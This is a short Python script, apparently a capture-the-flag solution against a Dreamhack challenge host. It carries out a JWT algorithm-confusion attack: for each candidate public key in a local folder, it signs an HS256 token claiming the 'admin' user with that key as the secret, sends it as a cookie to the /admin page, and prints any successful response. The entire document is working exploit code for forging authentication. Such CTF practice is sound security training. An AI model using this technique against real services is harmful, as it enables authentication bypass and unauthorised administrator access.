import requests
import os
import jwt

url = "http://host3.dreamhack.games:10328/"

candidates = [f for f in os.listdir("crack") if f.endswith("pem")]

for candidate in candidates:
    print("Trying:", candidate)

    with open(os.path.join("crack", candidate), "rb") as f:
        pub_key = f.read()

    token = jwt.encode(
        payload={ 'username': 'admin' },
        key=pub_key,
        algorithm="HS256"
    )

    res = requests.get(f'{url}/admin', cookies={
        'token': token
    })

    if "not found" not in res.text:
        print(res.text)